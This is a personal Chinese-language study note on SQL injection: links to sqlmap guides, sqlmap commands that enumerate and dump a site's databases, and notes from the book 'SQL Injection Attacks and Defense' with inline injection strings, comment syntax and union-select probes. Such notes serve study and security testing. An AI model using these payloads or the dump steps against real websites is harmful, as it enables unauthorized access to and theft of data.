目录
	SQL注入方法

[使用SQLMAP对网站和数据库进行SQL注入攻击](http://drops.wooyun.org/tips/2113)

[Sqlmap注入技巧收集整理](http://www.lxway.com/4089025404.htm)

[sqlmap 寻找注入点](http://www.lxway.com/931786.html)

[没有注入点，如何拿站](http://www.lxway.com/912111582.htm)

[手工注入](http://www.rising.com.cn/newsletter/news/2012-05-24/11580.html)

[sqlmap](https://github.com/sqlmapproject/sqlmap)

[SQL注入 | 最棒的相关资料汇总](http://mp.weixin.qq.com/s?__biz=MzAwMTUyMjQ5OA==&mid=402619216&idx=1&sn=0c2b3c741449ddb859203ebcc8eb04af&scene=0#wechat_redirect)

[sqlmap手册](https://github.com/sqlmapproject/sqlmap/blob/master/doc/translations/README-zh-CN.md)

# sqlmap步骤
//查数据库 
1、sqlmap -u http://www.xxx.com --dbs 
//查数据库表 
2、sqlmap -u http://www.xxx.com -D 数据库名 --tables 
//查数据库表字段 
3、sqlmap -u http://www.xxx.com -D 数据库名 -T 表名 --columns 
//查数据库字段内容 
4、sqlmap -u http://www.xxx.com -D 数据库名 -T 表名 -C 字段名1，字段名2，字段名3 --dump

sql注入攻击与防御 书笔记

# 应用响应
	通用错误：数据库错误回显
	相应代码 500 302
	不同的响应大小

## 2.2.4 sql盲注 P44
## 2.2.6 寻找sql注入漏洞的字符串
## 2.3.2 内联sql注入
	字符串内联注入的特政值：
		‘  
		1’ or '1'='1'	>	1') or('1'='1
		value' or '1'='2 	>	value') or ('1'='2
		1' and '1'='1 	>	1') and ('1'='1
		1' or 'ab'='a'+'b 	>	1') or ('ab'='a'+'b
		1' or 'ab'='a' 'b 	>	1') or ('ab'='a' 'b
		1' or 'ab'='a'||'b>	1') or ('ab'='a'||'b
	数字值内联注入
		‘
		1+1 		>	3-1
		value+0
		1 or 1=1 	>	1)or (1=1
		value or 1=2 	>	value)or(1=2
		1 and 1=2 	>	1)and(1=2
		1 or 'ab'='a'+'b'	>	1)or('ab'='a'+'b'	
		1 or 'ab'='a' 'b'	>	1)or('ab'='a' 'b'
		1 or 'ab'='a'||'b'>	1)or('ab'='a'||'b'
	2.33终止式sql注入
		数据库注释语法
			sqlserver oracle	--(double dash)(要求--后有空格)  /**/
			mysql 			# /**/
	2.4 连接运算符
		sqlserver	’a'+'b'='ab'
		mysql 		'a'  'b'  = 'ab'
		Oracle 		'a'||'b' ='ab'
	2.3.4 时间延迟
# 3 复查代码中的SQL注入
# 4 利用SQL注入漏洞
## 自动寻找SQL注入
	4.2 理解常见的利用技术
		使用堆迭查询 http://ferruh.mavituna.com/sql-injection-cheatsheet-oku
	4.3 识别数据库
		4.3.1 非盲跟踪
		4.3.2 盲跟踪P112
	4.4 匹配列
		4.4.1
			?id=12 union select null,null-- 
			?id=12 order by 1/2/3...
		4.4.2 匹配数据类型P115
	4.5 使用条件语句P120
sql注入攻击和防御 
	2.5身份验证中常用特征值P64